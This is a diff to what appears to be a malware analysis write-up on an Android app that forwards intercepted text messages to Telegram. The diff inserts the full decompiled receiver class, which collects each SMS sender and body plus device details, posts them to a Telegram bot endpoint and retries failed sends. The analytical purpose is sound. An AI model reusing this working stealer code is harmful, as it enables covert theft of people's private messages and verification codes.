@@ -32,12 +32,72 @@ public static final String telegram_url = "https://api.telegram.org/bot138892312
 ```
 ## 🕵️ Malicious Behavior Overview 
 ```xml
-public void onReceive(Context context, Intent intent) {
-    ...
-    String telegram_id = read.read(MainConstant.telegram_id_storage_key);
-    ...
-    String msg = "From: " + senderNum + "\nDevice Info: " + device_name + "\nMessage:\n" + message;
-    sendToTelegramAPI(context, telegram_id, msg, MainConstant.telegram_url, stack);
+public class SMSBroadcastReader extends BroadcastReceiver {
+    final SmsManager sms = SmsManager.getDefault();
+
+    @Override // android.content.BroadcastReceiver
+    public void onReceive(Context context, Intent intent) {
+        Bundle bundle = intent.getExtras();
+        String senderNum = "";
+        String message = "";
+        if (bundle != null) {
+            try {
+                Object[] pdusObj = (Object[]) bundle.get("pdus");
+                for (Object obj : pdusObj) {
+                    SmsMessage currentMessage = SmsMessage.createFromPdu((byte[]) obj);
+                    senderNum = currentMessage.getDisplayOriginatingAddress();
+                    message = message + currentMessage.getDisplayMessageBody();
+                }
+                Storage read = new Storage(context);
+                String telegram_id = read.read(MainConstant.telegram_id_storage_key);
+                SharedPreferences settings = PreferenceManager.getDefaultSharedPreferences(context);
+                String device_name = settings.getString("DeviceName", "Default");
+                if (device_name.equals("Default")) {
+                    device_name = Build.MANUFACTURER + "|" + Build.MODEL;
+                }
+                String msg = "From: " + senderNum + "\nDevice Info: " + device_name + "\nMessage:\n" + message;
+                StackMessages stack = new StackMessages(context);
+                if (stack.getStack() != null) {
+                    Set<String> unsentMsgs = stack.getStack();
+                    for (String unsentMsg : unsentMsgs) {
+                        sendToTelegramAPI(context, telegram_id, unsentMsg, MainConstant.telegram_url, stack);
+                    }
+                    sendToTelegramAPI(context, telegram_id, msg, MainConstant.telegram_url, stack);
+                    stack.clearStack();
+                    return;
+                }
+                sendToTelegramAPI(context, telegram_id, msg, MainConstant.telegram_url, stack);
+            } catch (Exception e) {
+                Log.e("SmsReceiver", "Exception smsReceiver" + e);
+            }
+        }
+    }
+
+    private void sendToTelegramAPI(Context context, final String telegram_id, final String msg, String url, final StackMessages stack) {
+        RequestQueue queue = Volley.newRequestQueue(context);
+        StringRequest stringRequest = new StringRequest(1, url, new Response.Listener<String>() { // from class: com.smodj.app.smstotelegram.SMSBroadcastReader.1
+            @Override // com.android.volley.Response.Listener
+            public void onResponse(String response) {
+                Log.d("Response", response);
+            }
+        }, new Response.ErrorListener() { // from class: com.smodj.app.smstotelegram.SMSBroadcastReader.2
+            @Override // com.android.volley.Response.ErrorListener
+            public void onErrorResponse(VolleyError error) {
+                Log.d("VolleyError", "That didn't work!");
+                stack.addToStack(msg);
+            }
+        }) { // from class: com.smodj.app.smstotelegram.SMSBroadcastReader.3
+            @Override // com.android.volley.Request
+            protected Map<String, String> getParams() throws AuthFailureError {
+                Map<String, String> params = new HashMap<>();
+                params.put("chat_id", telegram_id);
+                params.put("text", msg);
+                return params;
+            }
+        };
+        queue.add(stringRequest);
+    }
+}
 ```
 - Collects SMS sender and message
 - Reads device info (manufacturer + model)
